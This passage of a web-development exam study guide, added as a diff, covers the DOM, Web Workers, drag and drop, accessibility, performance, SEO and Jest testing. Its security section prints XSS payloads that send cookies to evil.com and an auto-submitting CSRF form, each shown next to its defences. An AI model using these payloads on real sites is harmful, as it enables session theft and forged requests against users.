+
+<h3 class="g-h3">Lifecycle Callbacks</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Callback</th>
+      <th>When called</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>connectedCallback()</code></td>
+      <td>Element added to DOM</td>
+    </tr>
+    <tr>
+      <td><code>disconnectedCallback()</code></td>
+      <td>Element removed from DOM</td>
+    </tr>
+    <tr>
+      <td><code>attributeChangedCallback(name, old, new)</code></td>
+      <td>Observed attribute changed</td>
+    </tr>
+    <tr>
+      <td><code>adoptedCallback()</code></td>
+      <td>Element moved to a new document</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h2 class="g-h2">9. HTML5 APIs: Web Workers, Drag and Drop</h2>
+
+<h3 class="g-h3">Web Workers</h3>
+
+<p>Web Workers run JavaScript in a <strong>background thread</strong> — separate from the main thread.</p>
+
+<p><strong>Key facts:</strong></p>
+<ul>
+  <li>Workers have NO access to the DOM</li>
+  <li>Workers communicate with the main thread via <code>postMessage()</code></li>
+  <li>Workers CAN make <code>fetch()</code> network requests</li>
+  <li>Workers share NO memory with the main thread by default (use <code>SharedArrayBuffer</code> explicitly)</li>
+  <li>Best for: CPU-intensive calculations that would block the UI</li>
+</ul>
+
+<div class="cb"><pre>// main.js
+const worker = new Worker('worker.js');
+worker.postMessage({ data: largeArray });
+worker.onmessage = (event) =&gt; {
+  console.log('Result:', event.data);
+};
+
+// worker.js
+self.onmessage = (event) =&gt; {
+  const result = heavyComputation(event.data.data);
+  self.postMessage(result);
+};</pre></div>
+
+<h3 class="g-h3">Drag and Drop API</h3>
+
+<p><strong>Minimum setup to make drag and drop work:</strong></p>
+
+<div class="cb"><pre>&lt;!-- Make element draggable --&gt;
+&lt;div draggable="true" id="item"&gt;Drag me&lt;/div&gt;
+
+&lt;!-- Drop target --&gt;
+&lt;div id="target"&gt;Drop here&lt;/div&gt;</pre></div>
+
+<div class="cb"><pre>// 1. On dragstart: set the data being dragged
+document.getElementById('item').addEventListener('dragstart', (e) =&gt; {
+  e.dataTransfer.setData('text/plain', e.target.id);
+});
+
+// 2. On dragover: MUST call preventDefault() or drop won't work!
+document.getElementById('target').addEventListener('dragover', (e) =&gt; {
+  e.preventDefault(); // THIS IS REQUIRED
+});
+
+// 3. On drop: retrieve the data and handle it
+document.getElementById('target').addEventListener('drop', (e) =&gt; {
+  e.preventDefault();
+  const id = e.dataTransfer.getData('text/plain');
+  e.target.appendChild(document.getElementById(id));
+});</pre></div>
+
+<p><strong>Critical:</strong> <code>preventDefault()</code> on <code>dragover</code> is <strong>REQUIRED</strong> — the default behavior prevents dropping.</p>
+
+<h4 class="g-h4">Example — minimal complete drag-and-drop handler set</h4>
+<div class="cb"><pre>&lt;!-- Markup --&gt;
+&lt;div id="card" draggable="true"&gt;Drag me&lt;/div&gt;
+&lt;div id="zone"&gt;Drop zone&lt;/div&gt;
+
+&lt;script&gt;
+const card = document.getElementById('card');
+const zone = document.getElementById('zone');
+
+// ── On the DRAGGABLE element ──────────────────────────────────────────────
+card.addEventListener('dragstart', (e) =&gt; {
+  e.dataTransfer.setData('text/plain', card.id); // store what's being dragged
+  e.dataTransfer.effectAllowed = 'move';
+});
+
+card.addEventListener('dragend', (e) =&gt; {
+  card.style.opacity = '1'; // restore visual after drag ends
+});
+
+// ── On the DROP TARGET ────────────────────────────────────────────────────
+zone.addEventListener('dragenter', (e) =&gt; {
+  e.preventDefault();
+  zone.classList.add('drag-over'); // visual feedback
+});
+
+zone.addEventListener('dragover', (e) =&gt; {
+  e.preventDefault();              // REQUIRED — without this, drop event never fires
+  e.dataTransfer.dropEffect = 'move';
+});
+
+zone.addEventListener('dragleave', (e) =&gt; {
+  zone.classList.remove('drag-over'); // remove visual feedback
+});
+
+zone.addEventListener('drop', (e) =&gt; {
+  e.preventDefault();
+  const id = e.dataTransfer.getData('text/plain');
+  zone.appendChild(document.getElementById(id)); // move element
+  zone.classList.remove('drag-over');
+});
+&lt;/script&gt;
+
+// Events required summary:
+// dragstart  → set data on the draggable
+// dragover   → preventDefault() to allow drop (MANDATORY)
+// drop       → getData() and handle it
+// dragenter / dragleave → optional visual feedback
+// dragend    → cleanup on the dragged element</pre></div>
+
+<h2 class="g-h2">10. DOM Manipulation (from practice exams)</h2>
+
+<p>This appeared in practice exams 7 and 15. Key concepts:</p>
+
+<h3 class="g-h3">DOM Traversal Properties</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Node-based (includes text nodes)</th>
+      <th>Element-only (elements only)</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>childNodes</code></td>
+      <td><code>children</code></td>
+    </tr>
+    <tr>
+      <td><code>parentNode</code></td>
+      <td><code>parentElement</code></td>
+    </tr>
+    <tr>
+      <td><code>nextSibling</code></td>
+      <td><code>nextElementSibling</code></td>
+    </tr>
+    <tr>
+      <td><code>previousSibling</code></td>
+      <td><code>previousElementSibling</code></td>
+    </tr>
+    <tr>
+      <td><code>firstChild</code></td>
+      <td><code>firstElementChild</code></td>
+    </tr>
+    <tr>
+      <td><code>lastChild</code></td>
+      <td><code>lastElementChild</code></td>
+    </tr>
+  </tbody>
+</table></div>
+
+<p><strong>Critical:</strong> <code>nextSibling</code> and <code>previousSibling</code> return <strong>text nodes</strong> (whitespace between HTML tags), NOT just elements. Use <code>nextElementSibling</code> to get the next element.</p>
+
+<h3 class="g-h3">DOM Selectors</h3>
+
+<div class="cb"><pre>// All valid selectors
+document.getElementById('myId')
+document.getElementsByClassName('myClass') // HTMLCollection, live
+document.getElementsByTagName('div')       // HTMLCollection, live
+document.querySelector('.myClass')         // first match
+document.querySelectorAll('.myClass')      // all matches, NodeList
+
+// querySelectorAll is "the most powerful selector" — accepts ANY valid CSS selector
+document.querySelectorAll(':nth-child(1)')
+document.querySelectorAll('a[href^="http"]')</pre></div>
+
+<p><strong>INVALID selectors (trap questions):</strong></p>
+<ul>
+  <li><code>document.getElementByClass()</code> — does NOT exist</li>
+  <li><code>document.querySelect()</code> — does NOT exist (it's <code>querySelector</code>)</li>
+</ul>
+
+<h3 class="g-h3">DOM Manipulation</h3>
+
+<div class="cb"><pre>// Create and append
+const p = document.createElement('p');
+p.textContent = 'Hello';
+document.body.appendChild(p);  // adds as LAST child
+
+// Insert before a specific sibling
+parent.insertBefore(newNode, referenceNode);
+
+// Remove
+parent.removeChild(child);  // invoked on the PARENT
+
+// Replace
+parent.replaceChild(newNode, oldNode);  // invoked on the PARENT</pre></div>
+
+<h3 class="g-h3">innerHTML vs textContent</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th></th>
+      <th>innerHTML</th>
+      <th>textContent / innerText</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>&lt;p&gt;hello&lt;/p&gt;</code></td>
+      <td>Renders as actual <code>&lt;p&gt;</code> element</td>
+      <td>Rendered as literal string <code>&lt;p&gt;hello&lt;/p&gt;</code></td>
+    </tr>
+    <tr>
+      <td>Use for</td>
+      <td>Dynamic HTML</td>
+      <td>Plain text (safer)</td>
+    </tr>
+    <tr>
+      <td>XSS risk</td>
+      <td>YES — never use with user input</td>
+      <td>No</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">dataset (HTML5 data attributes)</h3>
+
+<div class="cb"><pre>&lt;div data-user-id="42" data-role="admin"&gt;&lt;/div&gt;</pre></div>
+
+<div class="cb"><pre>const elem = document.querySelector('div');
+console.log(elem.dataset.userId);  // "42"  (camelCase conversion)
+elem.dataset.role = "guest";       // set new value</pre></div>
+
+<h3 class="g-h3">nodeType Values</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>nodeType</th>
+      <th>Node type</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td>1</td>
+      <td>Element node</td>
+    </tr>
+    <tr>
+      <td>2</td>
+      <td>Attribute node</td>
+    </tr>
+    <tr>
+      <td>3</td>
+      <td>Text node</td>
+    </tr>
+    <tr>
+      <td>8</td>
+      <td>Comment node</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">Event Handling</h3>
+
+<div class="cb"><pre>// addEventListener (PREFERRED — allows multiple handlers)
+element.addEventListener('click', function(event) {
+  event.stopPropagation();  // stop bubbling
+}, false);
+
+// Three ways to stop bubbling:
+event.stopPropagation();
+event.cancelBubble = true;
+event.stopImmediatePropagation();</pre></div>
+
+<p><strong>DOMContentLoaded</strong> — fires when document is fully loaded and parsed (before images load):</p>
+
+<div class="cb"><pre>document.addEventListener('DOMContentLoaded', function() {
+  // Safe to manipulate DOM here
+});</pre></div>
+
+<h2 class="g-h2">11. Security: XSS &amp; CSRF</h2>
+
+<h3 class="g-h3">XSS (Cross-Site Scripting)</h3>
+
+<p><strong>What it is:</strong> An attacker injects malicious JavaScript into a web page that is then executed in other users' browsers.</p>
+
+<p><strong>Types:</strong></p>
+<ul>
+  <li><strong>Stored XSS:</strong> Malicious script saved in database, served to all visitors</li>
+  <li><strong>Reflected XSS:</strong> Script is in URL parameter, reflected back in response</li>
+  <li><strong>DOM-based XSS:</strong> Script executed through client-side JavaScript</li>
+</ul>
+
+<p><strong>Example attack:</strong></p>
+
+<div class="cb"><pre>// User submits this as a comment:
+&lt;script&gt;document.location='https://evil.com/steal?cookie='+document.cookie&lt;/script&gt;
+
+// If site renders it as innerHTML without sanitization → all users get hacked</pre></div>
+
+<p><strong>Prevention:</strong></p>
+<ul>
+  <li><strong>Never use <code>innerHTML</code> with user input</strong> — use <code>textContent</code> instead</li>
+  <li>Sanitize/escape user input before rendering</li>
+  <li>Content Security Policy (CSP) headers</li>
+  <li><code>HttpOnly</code> cookies prevent JS from reading them (limits damage)</li>
+</ul>
+
+<h4 class="g-h4">Example — vulnerable innerHTML vs safe textContent</h4>
+<div class="cb"><pre>// Imagine the user typed this into a search box:
+const userInput = '&lt;img src=x onerror="document.location=\'https://evil.com?c=\'+document.cookie"&gt;';
+
+// ── VULNERABLE — innerHTML executes embedded scripts ──────────────────────
+const div = document.getElementById('output');
+div.innerHTML = userInput;
+// ↑ Browser parses the &lt;img&gt;, src fails, onerror runs → cookies stolen!
+
+// ── SAFE — textContent treats everything as plain text ────────────────────
+div.textContent = userInput;
+// ↑ Browser renders the literal string: &lt;img src=x onerror="..."&gt;
+//   No script executes. The tags are displayed as text, not parsed as HTML.
+
+// ── SAFE in React — JSX escapes by default ────────────────────────────────
+function Comment({ text }) {
+  return &lt;p&gt;{text}&lt;/p&gt;;
+  // React escapes text → &lt;img&gt; shows as literal text, not parsed
+}
+
+// ── DANGEROUS in React — dangerouslySetInnerHTML ──────────────────────────
+function DangerousComment({ html }) {
+  return &lt;p dangerouslySetInnerHTML={{ __html: html }} /&gt;;
+  // Only use when html comes from a trusted, sanitized source (e.g., DOMPurify)
+}</pre></div>
+
+<h3 class="g-h3">CSRF (Cross-Site Request Forgery)</h3>
+
+<p><strong>What it is:</strong> An attacker tricks an authenticated user's browser into making an unwanted request to the server. Since the browser automatically sends cookies, the server processes the malicious request as legitimate.</p>
+
+<p><strong>Example attack:</strong></p>
+
+<div class="cb"><pre>&lt;!-- Attacker's page embeds this hidden form --&gt;
+&lt;form action="https://bank.com/transfer" method="POST"&gt;
+  &lt;input name="amount" value="10000"&gt;
+  &lt;input name="to" value="attacker-account"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;
+&lt;!-- If user is logged in to bank.com, their session cookie is sent automatically --&gt;</pre></div>
+
+<p><strong>Prevention:</strong></p>
+<ul>
+  <li><strong>CSRF tokens:</strong> Server generates unique token per session, client must include it in every state-changing request</li>
+  <li><strong>SameSite=Strict cookies:</strong> Browser never sends cookies on cross-site requests</li>
+  <li><strong>Double Submit Cookie:</strong> Token in both cookie and request body</li>
+  <li>Check <code>Origin</code>/<code>Referer</code> headers</li>
+</ul>
+
+<h4 class="g-h4">Example — malicious CSRF form and CSRF token defense</h4>
+<div class="cb"><pre>// ── ATTACK: attacker's page auto-submits a form to bank.com ──────────────
+&lt;!-- On https://evil.com --&gt;
+&lt;form action="https://bank.com/transfer" method="POST" id="f"&gt;
+  &lt;input type="hidden" name="amount" value="10000"&gt;
+  &lt;input type="hidden" name="to"     value="attacker-account"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
+&lt;!-- Browser auto-sends the bank.com session cookie → transfer happens! --&gt;
+
+// ── DEFENSE 1: CSRF token (server generates unique token per session) ─────
+// Server renders the legitimate form with a hidden token:
+&lt;form action="/transfer" method="POST"&gt;
+  &lt;input type="hidden" name="_csrf" value="k9mX3pQr7sLt"&gt;
+  &lt;input name="amount" value="50"&gt;
+  &lt;button&gt;Transfer&lt;/button&gt;
+&lt;/form&gt;
+
+// Attacker's hidden form does NOT know the token value
+// Server rejects any POST without the correct _csrf token
+// Result: attacker's auto-submit is rejected (token mismatch)
+
+// ── DEFENSE 2: SameSite=Strict cookie ────────────────────────────────────
+Set-Cookie: sessionId=abc; SameSite=Strict; HttpOnly; Secure
+// Browser will NOT send this cookie when the request comes from evil.com
+// Even though the form posts to bank.com → no cookie → 401 Unauthorized
+
+// ── DEFENSE 3: Check Origin/Referer header ────────────────────────────────
+// Server checks: does the Origin header match the expected domain?
+if (request.headers.get('origin') !== 'https://bank.com') {
+  return Response.json({ error: 'Forbidden' }, { status: 403 });
+}</pre></div>
+
+<p><strong>CSRF vs XSS:</strong></p>
+<ul>
+  <li>XSS: Code runs <strong>in the victim's browser</strong> on the legitimate site</li>
+  <li>CSRF: Attacker tricks browser into making a <strong>request to the legitimate site</strong></li>
+</ul>
+
+<h2 class="g-h2">12. Accessibility</h2>
+
+<h3 class="g-h3">Why Accessibility Matters</h3>
+
+<p>Accessibility (a11y) ensures web content is usable by people with disabilities (visual, auditory, motor, cognitive). It is also often a legal requirement.</p>
+
+<h3 class="g-h3">Semantic HTML</h3>
+
+<p><strong>Use the right element for the right job</strong> — semantic elements communicate meaning to assistive technologies (screen readers).</p>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Use</th>
+      <th>Don't use</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>&lt;button&gt;</code> for buttons</td>
+      <td><code>&lt;div onclick&gt;</code> for buttons</td>
+    </tr>
+    <tr>
+      <td><code>&lt;nav&gt;</code> for navigation</td>
+      <td><code>&lt;div class="nav"&gt;</code></td>
+    </tr>
+    <tr>
+      <td><code>&lt;main&gt;</code> for main content</td>
+      <td><code>&lt;div id="main"&gt;</code></td>
+    </tr>
+    <tr>
+      <td><code>&lt;article&gt;</code> for standalone content</td>
+      <td>Generic <code>&lt;div&gt;</code></td>
+    </tr>
+    <tr>
+      <td><code>&lt;h1&gt;</code>-<code>&lt;h6&gt;</code> for headings</td>
+      <td><code>&lt;div class="heading"&gt;</code></td>
+    </tr>
+    <tr>
+      <td><code>&lt;label&gt;</code> + <code>&lt;input&gt;</code> for forms</td>
+      <td><code>&lt;div&gt;Name: &lt;input&gt;</code></td>
+    </tr>
+    <tr>
+      <td><code>&lt;table&gt;</code> for tabular data</td>
+      <td><code>&lt;div&gt;</code> grid for tables</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<h3 class="g-h3">ARIA (Accessible Rich Internet Applications)</h3>
+
+<p>ARIA attributes add semantic meaning when HTML alone is insufficient.</p>
+
+<div class="cb"><pre>&lt;!-- role: defines what the element IS --&gt;
+&lt;div role="button" tabindex="0"&gt;Click me&lt;/div&gt;
+
+&lt;!-- aria-label: provides accessible name when text isn't visible --&gt;
+&lt;button aria-label="Close dialog"&gt;&times;&lt;/button&gt;
+
+&lt;!-- aria-labelledby: point to element that provides the label --&gt;
+&lt;h2 id="dialog-title"&gt;Settings&lt;/h2&gt;
+&lt;dialog aria-labelledby="dialog-title"&gt;...&lt;/dialog&gt;
+
+&lt;!-- aria-describedby: provides additional description --&gt;
+&lt;input aria-describedby="email-hint" /&gt;
+&lt;p id="email-hint"&gt;Enter your work email address&lt;/p&gt;
+
+&lt;!-- aria-expanded: state for collapsible elements --&gt;
+&lt;button aria-expanded="false" aria-controls="menu"&gt;Menu&lt;/button&gt;
+&lt;ul id="menu" hidden&gt;...&lt;/ul&gt;
+
+&lt;!-- aria-hidden: hide from assistive technology --&gt;
+&lt;span aria-hidden="true"&gt;&#9733;&#9733;&#9733;&#9733;&#9734;&lt;/span&gt;
+&lt;span class="sr-only"&gt;4 out of 5 stars&lt;/span&gt;
+
+&lt;!-- aria-live: announce dynamic content updates --&gt;
+&lt;div aria-live="polite"&gt;Loading complete...&lt;/div&gt;
+&lt;div aria-live="assertive"&gt;Error! Please try again.&lt;/div&gt;</pre></div>
+
+<p><strong>Rule:</strong> Use semantic HTML first. Only use ARIA when semantic HTML is not sufficient. "No ARIA is better than bad ARIA."</p>
+
+<h4 class="g-h4">Example — bad div button vs proper button with aria-label</h4>
+<div class="cb"><pre>// ── BAD: div with onclick — inaccessible ─────────────────────────────────
+&lt;div onclick="closeModal()" style="cursor:pointer"&gt;&times;&lt;/div&gt;
+// Problems:
+// - Screen reader announces: "times" (the × character) — meaningless
+// - Not focusable via Tab — keyboard users can't reach it
+// - No role — screen reader doesn't know it's interactive
+// - No keyboard handler — pressing Enter does nothing
+
+// ── ALSO BAD: div with role but missing keyboard support ──────────────────
+&lt;div role="button" onclick="closeModal()"&gt;&times;&lt;/div&gt;
+// Still not focusable (missing tabindex) and Enter/Space don't work
+
+// ── GOOD: native button with aria-label ──────────────────────────────────
+&lt;button
+  type="button"
+  aria-label="Close dialog"
+  onClick={closeModal}
+&gt;
+  &times;
+&lt;/button&gt;
+// Benefits:
+// - Screen reader announces: "Close dialog, button"
+// - Focusable via Tab automatically
+// - Enter and Space activate it automatically
+// - No extra JS needed for keyboard support
+
+// ── GOOD: icon button in React ───────────────────────────────────────────
+&lt;button type="button" aria-label="Delete item" onClick={() =&gt; deleteItem(id)}&gt;
+  &lt;TrashIcon aria-hidden="true" /&gt;  {/* hide icon from screen reader — label already describes it */}
+&lt;/button&gt;</pre></div>
+
+<h3 class="g-h3">Keyboard Navigation</h3>
+
+<p>All interactive elements must be usable with keyboard alone:</p>
+<ul>
+  <li><strong>Tab</strong> — move to next focusable element</li>
+  <li><strong>Shift+Tab</strong> — move to previous focusable element</li>
+  <li><strong>Enter/Space</strong> — activate button or link</li>
+  <li><strong>Arrow keys</strong> — navigate within components (dropdowns, menus)</li>
+</ul>
+
+<div class="cb"><pre>&lt;!-- Make custom elements focusable --&gt;
+&lt;div role="button" tabindex="0"
+     onClick={handleClick}
+     onKeyDown={(e) =&gt; e.key === 'Enter' &amp;&amp; handleClick()}&gt;
+  Custom Button
+&lt;/div&gt;
+
+&lt;!-- Skip navigation link (jumps past nav to main content) --&gt;
+&lt;a href="#main-content" class="sr-only focus:not-sr-only"&gt;
+  Skip to main content
+&lt;/a&gt;
+
+&lt;!-- Focus management: trap focus in modal --&gt;
+&lt;dialog&gt;
+  &lt;!-- First focusable element gets focus on open --&gt;
+  &lt;!-- Tab loops within dialog --&gt;
+  &lt;!-- Esc closes dialog and returns focus --&gt;
+&lt;/dialog&gt;</pre></div>
+
+<p><strong><code>tabindex</code> values:</strong></p>
+<ul>
+  <li><code>tabindex="0"</code> — element participates in natural tab order</li>
+  <li><code>tabindex="-1"</code> — element is focusable programmatically but not via Tab</li>
+  <li><code>tabindex="1"</code> (or positive) — avoid, creates unpredictable tab order</li>
+</ul>
+
+<h4 class="g-h4">Example — tab order with tabindex</h4>
+<div class="cb"><pre>&lt;!-- Tab order follows DOM order for tabindex="0" and native elements --&gt;
+
+&lt;a href="/home"&gt;Home&lt;/a&gt;           &lt;!-- focusable, in natural tab order --&gt;
+&lt;button&gt;Submit&lt;/button&gt;             &lt;!-- focusable, in natural tab order --&gt;
+&lt;input type="text" /&gt;              &lt;!-- focusable, in natural tab order --&gt;
+
+&lt;!-- tabindex="0": custom element joins the tab order at its DOM position --&gt;
+&lt;div role="button" tabindex="0" onClick={fn} onKeyDown={(e) =&gt; e.key === 'Enter' &amp;&amp; fn()}&gt;
+  Custom button
+&lt;/div&gt;
+
+&lt;!-- tabindex="-1": reachable by JS focus() but NOT via Tab key
+     Use case: programmatically focus a modal when it opens --&gt;
+&lt;div id="modal" tabindex="-1" role="dialog"&gt;...&lt;/div&gt;
+&lt;script&gt;
+  // When modal opens, move focus into it:
+  document.getElementById('modal').focus();
+&lt;/script&gt;
+
+&lt;!-- tabindex="5": AVOID — jumps to front of tab order regardless of position
+     Tab order: tabindex=1 → tabindex=2 → tabindex=5 → then tabindex=0 elements
+     This makes tab order jump around confusingly --&gt;
+&lt;div tabindex="5"&gt;This gets focused first — bad!&lt;/div&gt;
+&lt;a href="/"&gt;This gets focused later despite being first in DOM — confusing!&lt;/a&gt;</pre></div>
+
+<h3 class="g-h3">Color Contrast</h3>
+
+<ul>
+  <li>Normal text: minimum 4.5:1 contrast ratio (WCAG AA)</li>
+  <li>Large text (18pt+ or 14pt+ bold): minimum 3:1</li>
+  <li>UI components: minimum 3:1</li>
+</ul>
+
+<h2 class="g-h2">13. Performance</h2>
+
+<h3 class="g-h3">Lazy Loading</h3>
+
+<p><strong>Images:</strong></p>
+
+<div class="cb"><pre>&lt;!-- Native lazy loading — image loads only when entering viewport --&gt;
+&lt;img src="large-photo.jpg" loading="lazy" alt="Description"&gt;</pre></div>
+
+<p><strong>Code splitting with dynamic imports:</strong></p>
+
+<div class="cb"><pre>// React lazy loading
+const HeavyChart = React.lazy(() =&gt; import('./HeavyChart'));
+
+function Dashboard() {
+  return (
+    &lt;Suspense fallback={&lt;div&gt;Loading chart...&lt;/div&gt;}&gt;
+      &lt;HeavyChart /&gt;
+    &lt;/Suspense&gt;
+  );
+}
+
+// Next.js dynamic imports
+import dynamic from 'next/dynamic';
+const Chart = dynamic(() =&gt; import('./Chart'), { loading: () =&gt; &lt;p&gt;Loading...&lt;/p&gt; });</pre></div>
+
+<h4 class="g-h4">Example — dynamic import on demand + React.lazy with Suspense</h4>
+<div class="cb"><pre>// ── Plain dynamic import (no React) ──────────────────────────────────────
+// The HeavyModule JS file is NOT downloaded until the button is clicked
+document.getElementById('load-btn').addEventListener('click', async () =&gt; {
+  const { processData } = await import('./heavyModule.js');
+  // ↑ Browser downloads heavyModule.js only NOW (code splitting)
+  processData(someData);
+});
+
+// ── React.lazy — load a component only when it's first rendered ───────────
+import React, { Suspense, lazy, useState } from 'react';
+
+// Component file is NOT in the initial JS bundle
+const MapView = lazy(() =&gt; import('./MapView'));
+
+function App() {
+  const [showMap, setShowMap] = useState(false);
+
+  return (
+    &lt;div&gt;
+      &lt;button onClick={() =&gt; setShowMap(true)}&gt;Show Map&lt;/button&gt;
+
+      {showMap &amp;&amp; (
+        // Suspense provides a fallback while MapView.js downloads
+        &lt;Suspense fallback={&lt;div&gt;Loading map...&lt;/div&gt;}&gt;
+          &lt;MapView lat={64.13} lon={-21.89} /&gt;
+        &lt;/Suspense&gt;
+      )}
+    &lt;/div&gt;
+  );
+}
+// Result: initial bundle is smaller. MapView.js only downloads when user clicks.</pre></div>
+
+<h3 class="g-h3">Code Splitting</h3>
+
+<p><strong>Why:</strong> Don't load all JavaScript upfront. Split into chunks that load when needed.</p>
+<p><strong>Next.js does this automatically</strong> — each page/route is its own chunk. Server Components also reduce client-side JS bundle.</p>
+
+<h3 class="g-h3">Memoization in React</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Tool</th>
+      <th>What it memoizes</th>
+      <th>When to use</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code>useMemo</code></td>
+      <td>A <strong>computed value</strong></td>
+      <td>Expensive calculations that depend on specific deps</td>
+    </tr>
+    <tr>
+      <td><code>useCallback</code></td>
+      <td>A <strong>function reference</strong></td>
+      <td>Pass stable function references to memoized children</td>
+    </tr>
+    <tr>
+      <td><code>React.memo</code></td>
+      <td>A <strong>component</strong></td>
+      <td>Prevents re-render if props haven't changed</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<div class="cb"><pre>// useMemo — cache the result of expensive filtering
+const filteredProducts = useMemo(() =&gt;
+  products.filter(p =&gt; p.category === category),
+  [products, category]
+);
+
+// useCallback — stable function reference for memoized child
+const handleAdd = useCallback((item: CartItem) =&gt; {
+  setCart(prev =&gt; [...prev, item]);
+}, []); // empty deps = stable reference forever
+
+// React.memo — component won't re-render if props unchanged
+const CartItem = React.memo(({ item, onRemove }) =&gt; (
+  &lt;div&gt;{item.name} &lt;button onClick={() =&gt; onRemove(item.id)}&gt;Remove&lt;/button&gt;&lt;/div&gt;
+));</pre></div>
+
+<p><strong>Functional updater pattern</strong> ("betri leid" — the better way):</p>
+
+<div class="cb"><pre>// Without functional updater: todos must be in deps array
+const handleAdd = useCallback((text: string) =&gt; {
+  setTodos([...todos, { id: nextId++, text }]);
+}, [todos]); // recreated every time todos changes!
+
+// WITH functional updater: empty deps array, stable reference
+const handleAdd = useCallback((text: string) =&gt; {
+  setTodos(prev =&gt; [...prev, { id: nextId++, text }]);
+}, []); // NEVER recreated</pre></div>
+
+<h3 class="g-h3">Core Web Vitals</h3>
+
+<div class="tw"><table>
+  <thead>
+    <tr>
+      <th>Metric</th>
+      <th>What it measures</th>
+      <th>Target</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>LCP</strong> (Largest Contentful Paint)</td>
+      <td>How fast the main content loads</td>
+      <td>&lt; 2.5s</td>
+    </tr>
+    <tr>
+      <td><strong>FID</strong> / <strong>INP</strong> (Interaction to Next Paint)</td>
+      <td>How responsive to user input</td>
+      <td>&lt; 200ms</td>
+    </tr>
+    <tr>
+      <td><strong>CLS</strong> (Cumulative Layout Shift)</td>
+      <td>Visual stability (no jumping content)</td>
+      <td>&lt; 0.1</td>
+    </tr>
+  </tbody>
+</table></div>
+
+<p><strong>Next.js Image component</strong> addresses:</p>
+<ul>
+  <li>LCP (optimized, correct-size images)</li>
+  <li>CLS (reserves space to prevent layout shift)</li>
+</ul>
+
+<h2 class="g-h2">14. SEO Basics</h2>
+
+<h3 class="g-h3">Why Server Components Help SEO</h3>
+
+<p>Search engines can only read HTML. JavaScript-rendered content (CSR) may not be indexed. Server-rendered HTML (Next.js Server Components) is immediately readable by crawlers.</p>
+
+<h3 class="g-h3">Metadata in Next.js</h3>
+
+<div class="cb"><pre>// Static metadata
+export const metadata: Metadata = {
+  title: 'My Page Title',
+  description: 'Page description for search engines',
+  openGraph: {
+    title: 'My Page',
+    description: 'Social share description',
+    images: ['/og-image.jpg'],
+  },
+};
+
+// Dynamic metadata
+export async function generateMetadata({ params }: Props) {
+  const product = await getProduct(params.id);
+  return {
+    title: product.name,
+    description: product.description,
+  };
+}</pre></div>
+
+<h3 class="g-h3">SEO Best Practices</h3>
+
+<ul>
+  <li><strong>Semantic HTML</strong> — <code>&lt;h1&gt;</code>, <code>&lt;article&gt;</code>, <code>&lt;nav&gt;</code> help crawlers understand structure</li>
+  <li><strong><code>&lt;h1&gt;</code> once per page</strong> — the main heading</li>
+  <li><strong>Alt text on images</strong> — describes images for crawlers and screen readers</li>
+  <li><strong>Descriptive URLs</strong> — <code>/products/blue-widget</code> beats <code>/products?id=42</code></li>
+  <li><strong>Canonical URLs</strong> — <code>&lt;link rel="canonical"&gt;</code> prevents duplicate content</li>
+  <li><strong>Server-side rendering</strong> — crawlers get content immediately</li>
+  <li><strong>Page speed</strong> — Core Web Vitals are a ranking factor</li>
+</ul>
+
+<h2 class="g-h2">15. Testing (Jest &amp; React Testing Library)</h2>
+
+<h3 class="g-h3">Jest Basics</h3>
+
+<p><strong>Jest</strong> is a JavaScript testing framework used for unit and integration tests.</p>
+
+<div class="cb"><pre>// Basic test structure
+describe('UserCard component', () =&gt; {
+  it('renders the user name', () =&gt; {
+    // Arrange, Act, Assert (AAA pattern)
+    expect(1 + 1).toBe(2);
+    expect({ name: 'Alice' }).toEqual({ name: 'Alice' });
+    expect(null).toBeNull();
+    expect([1, 2, 3]).toContain(2);
+    expect(fn).toHaveBeenCalledWith('arg');
+  });
+});
+
+// Mock a module
+jest.mock('./api', () =&gt; ({
+  fetchUser: jest.fn().mockResolvedValue({ name: 'Alice' }),
+}));</pre></div>
+
+<p><strong>Common matchers:</strong></p>
+<ul>
+  <li><code>toBe(val)</code> — strict equality (===)</li>
+  <li><code>toEqual(val)</code> — deep equality (for objects/arrays)</li>
+  <li><code>toBeTruthy()</code> / <code>toBeFalsy()</code></li>
+  <li><code>toContain(item)</code> — array/string contains</li>
+  <li><code>toThrow()</code> — function throws an error</li>
+  <li><code>toHaveBeenCalled()</code> / <code>toHaveBeenCalledWith(...args)</code></li>
+</ul>
+
+<h3 class="g-h3">React Testing Library</h3>
+
+<p><strong>Philosophy:</strong> Test behavior from the user's perspective, not implementation details.</p>
+
+<div class="cb"><pre>import { render, screen, fireEvent } from '@testing-library/react';
+import userEvent from '@testing-library/user-event';
+
+describe('Counter', () =&gt; {
+  it('increments when button is clicked', async () =&gt; {
+    const user = userEvent.setup();
+    render(&lt;Counter /&gt;);
+
+    // Query by role (preferred) or text
+    const button = screen.getByRole('button', { name: /increment/i });
+    const count = screen.getByText('Count: 0');
+
+    await user.click(button);
+
+    expect(screen.getByText('Count: 1')).toBeInTheDocument();
+  });
+});</pre></div>
+
+<p><strong>Query priority (use in this order):</strong></p>
+<ol>
+  <li><code>getByRole</code> — best, most accessible</li>
+  <li><code>getByLabelText</code> — for form inputs</li>
+  <li><code>getByPlaceholderText</code></li>
+  <li><code>getByText</code></li>
+  <li><code>getByTestId</code> — last resort</li>
+</ol>
+
+<p><strong>Query variants:</strong></p>
+<ul>
